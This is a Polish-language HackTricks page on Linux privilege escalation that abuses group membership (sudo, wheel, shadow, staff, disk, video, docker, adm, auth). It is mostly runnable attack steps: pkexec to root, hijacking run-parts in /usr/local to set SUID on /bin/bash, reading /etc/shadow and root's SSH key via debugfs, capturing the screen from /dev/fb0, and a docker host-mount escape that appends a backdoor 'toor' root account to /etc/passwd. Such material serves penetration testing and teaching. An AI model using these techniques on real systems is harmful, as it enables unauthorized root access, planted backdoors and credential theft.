# Interesting Groups - Linux Privesc

{{#include ../../../banners/hacktricks-training.md}}

## Sudo/Admin Groups

### **PE - Method 1**

**Czasami**, **domyślnie (lub dlatego, że wymaga tego określone oprogramowanie)** w pliku **/etc/sudoers** można znaleźć niektóre z tych wierszy:
```bash
# Allow members of group sudo to execute any command
%sudo	ALL=(ALL:ALL) ALL

# Allow members of group admin to execute any command
%admin 	ALL=(ALL:ALL) ALL
```
Oznacza to, że **każdy użytkownik należący do grupy sudo lub admin może wykonać dowolne polecenie za pomocą sudo**.

Jeśli tak jest, aby **zostać rootem, wystarczy wykonać**:
```
sudo su
```
### PE - Method 2

Znajdź wszystkie pliki binarne suid i sprawdź, czy znajduje się wśród nich plik binarny **Pkexec**:
```bash
find / -perm -4000 2>/dev/null
```
Jeśli znajdziesz, że plik binarny **pkexec jest plikiem binarnym SUID**, a należysz do grupy **sudo** lub **admin**, prawdopodobnie możesz wykonywać pliki binarne jako sudo za pomocą `pkexec`.\
Dzieje się tak, ponieważ zazwyczaj są to grupy określone w **polityce polkit**. Ta polityka zasadniczo określa, które grupy mogą używać `pkexec`. Sprawdź to za pomocą:
```bash
cat /etc/polkit-1/localauthority.conf.d/*
```
Tam znajdziesz informacje o tym, które grupy mogą wykonywać **pkexec**, a **domyślnie** w niektórych dystrybucjach Linuxa pojawiają się grupy **sudo** i **admin**.

Aby **zostać rootem, możesz wykonać**:
```bash
pkexec "/bin/sh" #You will be prompted for your user password
```
Jeśli spróbujesz wykonać **pkexec** i otrzymasz ten **błąd**:
```bash
polkit-agent-helper-1: error response to PolicyKit daemon: GDBus.Error:org.freedesktop.PolicyKit1.Error.Failed: No session for cookie
==== AUTHENTICATION FAILED ===
Error executing command as another user: Not authorized
```
**Nie dzieje się tak dlatego, że nie masz uprawnień, lecz dlatego, że nie jesteś połączony bez GUI**. Obejście tego problemu znajduje się tutaj: [https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903](https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903). Potrzebujesz **2 różnych sesji ssh**:
```bash:session1
echo $$ #Step1: Get current PID
pkexec "/bin/bash" #Step 3, execute pkexec
#Step 5, if correctly authenticate, you will have a root session
```

```bash:session2
pkttyagent --process <PID of session1> #Step 2, attach pkttyagent to session1
#Step 4, you will be asked in this session to authenticate to pkexec
```
## Grupa wheel

**Czasami**, **domyślnie** w pliku **/etc/sudoers** można znaleźć następującą linię:
```
%wheel	ALL=(ALL:ALL) ALL
```
Oznacza to, że **każdy użytkownik należący do grupy wheel może wykonywać dowolne polecenia za pomocą sudo**.

Jeśli tak jest, aby **zostać rootem, wystarczy wykonać**:
```
sudo su
```
## Grupa shadow

Użytkownicy z **grupy shadow** mogą **odczytywać** plik **/etc/shadow**:
```
-rw-r----- 1 root shadow 1824 Apr 26 19:10 /etc/shadow
```
Przeczytaj więc plik i spróbuj **złamać niektóre hashe**.

Krótka uwaga dotycząca stanu blokady podczas analizy hashy:
- Wpisy zawierające `!` lub `*` są zazwyczaj nieinteraktywne w przypadku logowania za pomocą hasła.
- `!hash` zwykle oznacza, że hasło zostało ustawione, a następnie zablokowane.
- `*` zwykle oznacza, że nigdy nie ustawiono prawidłowego hasha hasła.
Jest to przydatne podczas klasyfikowania kont, nawet gdy bezpośrednie logowanie jest zablokowane.

## Grupa Staff

**staff**: Umożliwia użytkownikom dodawanie lokalnych modyfikacji do systemu (`/usr/local`) bez konieczności posiadania uprawnień root (należy pamiętać, że pliki wykonywalne w `/usr/local/bin` znajdują się w zmiennej PATH każdego użytkownika i mogą „zastępować” pliki wykonywalne o tej samej nazwie w `/bin` i `/usr/bin`). Dla porównania, grupa „adm” jest bardziej powiązana z monitorowaniem i bezpieczeństwem. [\[source\]](https://wiki.debian.org/SystemGroups)

W dystrybucjach Debiana zmienna `$PATH` wskazuje, że `/usr/local/` będzie uruchamiany z najwyższym priorytetem, niezależnie od tego, czy jesteś użytkownikiem uprzywilejowanym.
```bash
$ echo $PATH
/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games

# echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```
Jeśli możemy przejąć niektóre programy w `/usr/local`, możemy łatwo uzyskać uprawnienia root.

Przejęcie programu `run-parts` to łatwy sposób na uzyskanie uprawnień root, ponieważ wiele programów uruchamia `run-parts`, na przykład `crontab` i podczas logowania przez ssh.
```bash
$ cat /etc/crontab | grep run-parts
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.daily; }
47 6    * * 7   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.weekly; }
52 6    1 * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.monthly; }
```
lub gdy loguje się nowa sesja SSH.
```bash
$ pspy64
2024/02/01 22:02:08 CMD: UID=0     PID=1      | init [2]
2024/02/01 22:02:10 CMD: UID=0     PID=17883  | sshd: [accepted]
2024/02/01 22:02:10 CMD: UID=0     PID=17884  | sshd: [accepted]
2024/02/01 22:02:14 CMD: UID=0     PID=17886  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
2024/02/01 22:02:14 CMD: UID=0     PID=17887  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
2024/02/01 22:02:14 CMD: UID=0     PID=17888  | run-parts --lsbsysinit /etc/update-motd.d
2024/02/01 22:02:14 CMD: UID=0     PID=17889  | uname -rnsom
2024/02/01 22:02:14 CMD: UID=0     PID=17890  | sshd: mane [priv]
2024/02/01 22:02:15 CMD: UID=0     PID=17891  | -bash
```
**Exploit**
```bash
# 0x1 Add a run-parts script in /usr/local/bin/
$ vi /usr/local/bin/run-parts
#! /bin/bash
chmod 4777 /bin/bash

# 0x2 Don't forget to add a execute permission
$ chmod +x /usr/local/bin/run-parts

# 0x3 start a new ssh sesstion to trigger the run-parts program

# 0x4 check premission for `u+s`
$ ls -la /bin/bash
-rwsrwxrwx 1 root root 1099016 May 15  2017 /bin/bash

# 0x5 root it
$ /bin/bash -p
```
## Grupa dyskowa

Ten przywilej jest niemal **równoważny z root access**, ponieważ możesz uzyskać dostęp do wszystkich danych znajdujących się na maszynie.

Files:`/dev/sd[a-z][1-9]`
```bash
df -h #Find where "/" is mounted
debugfs /dev/sda1
debugfs: cd /root
debugfs: ls
debugfs: cat /root/.ssh/id_rsa
debugfs: cat /etc/shadow
```
Zauważ, że używając debugfs, możesz także **zapisywać pliki**. Na przykład, aby skopiować `/tmp/asd1.txt` do `/tmp/asd2.txt`, możesz wykonać:
```bash
debugfs -w /dev/sda1
debugfs:  dump /tmp/asd1.txt /tmp/asd2.txt
```
Jednak jeśli spróbujesz **zapisywać pliki należące do root** (takie jak `/etc/shadow` lub `/etc/passwd`), pojawi się błąd "**Permission denied**".

## Grupa Video

Za pomocą polecenia `w` możesz sprawdzić, **kto jest zalogowany w systemie**, a polecenie wyświetli dane wyjściowe podobne do poniższych:
```bash
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
yossi    tty1                      22:16    5:13m  0.05s  0.04s -bash
moshe    pts/1    10.10.14.44      02:53   24:07   0.06s  0.06s /bin/bash
```
**tty1** oznacza, że użytkownik **yossi jest fizycznie zalogowany** do terminala na maszynie.

Grupa **video** ma dostęp do podglądu obrazu wyświetlanego na ekranie. Zasadniczo można obserwować zawartość ekranów. Aby to zrobić, należy **pobrać bieżący obraz ekranu** w postaci surowych danych oraz uzyskać rozdzielczość używaną przez ekran. Dane ekranu mogą być zapisane w `/dev/fb0`, a rozdzielczość tego ekranu można znaleźć w `/sys/class/graphics/fb0/virtual_size`
```bash
cat /dev/fb0 > /tmp/screen.raw
cat /sys/class/graphics/fb0/virtual_size
```
Aby **otworzyć** **raw image**, możesz użyć **GIMP**, wybrać plik **`screen.raw`** i jako typ pliku wybrać **Raw image data**:

![Disk Group - Video Group: Aby otworzyć raw image, możesz użyć GIMP, wybrać plik screen.raw i jako typ pliku wybrać Raw image data](<../../../images/image (463).png>)

Następnie zmień Width i Height na wartości używane na ekranie i sprawdź różne Image Types (wybierając ten, który najlepiej wyświetla ekran):

![Disk Group - Video Group: Następnie zmień Width i Height na wartości używane na ekranie i sprawdź różne Image Types (wybierając ten, który najlepiej wyświetla ekran)](<../../../images/image (317).png>)

## Root Group

Wygląda na to, że domyślnie **members of root group** mogą mieć dostęp do **modyfikowania** niektórych plików konfiguracyjnych **service**, plików niektórych **libraries** lub **innych interesujących rzeczy**, które można wykorzystać do eskalacji uprawnień...

**Sprawdź, które pliki mogą modyfikować members of root**:
```bash
find / -group root -perm -g=w 2>/dev/null
```
## Grupa Docker

Możesz **zamontować główny system plików maszyny hosta jako wolumin instancji**, dzięki czemu po uruchomieniu instancja natychmiast ładuje `chroot` do tego woluminu. W praktyce daje ci to root na maszynie.
```bash
docker image #Get images from the docker service

#Get a shell inside a docker container with access as root to the filesystem
docker run -it --rm -v /:/mnt <imagename> chroot /mnt bash
#If you want full access from the host, create a backdoor in the passwd file
echo 'toor:$1$.ZcF5ts0$i4k6rQYzeegUkacRCvfxC0:0:0:root:/root:/bin/sh' >> /etc/passwd

#Ifyou just want filesystem and network access you can startthe following container:
docker run --rm -it --pid=host --net=host --privileged -v /:/mnt <imagename> chroot /mnt bashbash
```
Na koniec, jeśli nie podobają Ci się żadne z wcześniejszych sugestii lub z jakiegoś powodu nie działają (docker api firewall?), zawsze możesz spróbować **uruchomić uprzywilejowany kontener i wydostać się z niego**, zgodnie z wyjaśnieniem tutaj:


{{#ref}}
../../containers-namespaces/container-security/
{{#endref}}

Jeśli masz uprawnienia zapisu do socketu dockera, przeczytaj [**ten post o eskalacji uprawnień poprzez wykorzystanie socketu dockera**](../../1-linux-basics/linux-privilege-escalation/index.html#writable-docker-socket)**.**


{{#ref}}
https://github.com/KrustyHack/docker-privilege-escalation
{{#endref}}


{{#ref}}
https://fosterelli.co/privilege-escalation-via-docker.html
{{#endref}}

## lxc/lxd Group


{{#ref}}
./
{{#endref}}

## Adm Group

Zwykle **członkowie** grupy **`adm`** mają uprawnienia do **odczytu plików log** znajdujących się w _/var/log/_.\
Dlatego jeśli udało Ci się przejąć użytkownika należącego do tej grupy, zdecydowanie powinieneś **sprawdzić logi**.

## Backup / Operator / lp / Mail groups

Grupy te często stanowią wektory **credential-discovery**, a nie bezpośrednie wektory prowadzące do roota:
- **backup**: może ujawniać archiwa zawierające konfiguracje, klucze, zrzuty baz danych lub tokeny.
- **operator**: specyficzny dla platformy dostęp operacyjny, który może prowadzić do wycieku poufnych danych runtime.
- **lp**: kolejki/druki mogą zawierać treść dokumentów.
- **mail**: kolejki pocztowe mogą ujawniać linki resetowania, OTP oraz wewnętrzne dane uwierzytelniające.

Traktuj członkostwo w tych grupach jako istotne ustalenie dotyczące ujawnienia danych i wykonuj pivoting, wykorzystując ponowne użycie haseł/tokenów.

## Auth group

W OpenBSD grupa **auth** zwykle może zapisywać w folderach _**/etc/skey**_ oraz _**/var/db/yubikey**_, jeśli są one używane.\
Uprawnienia te mogą zostać nadużyte za pomocą następującego exploita w celu **eskalacji uprawnień** do roota: [https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot](https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot)

{{#include ../../../banners/hacktricks-training.md}}
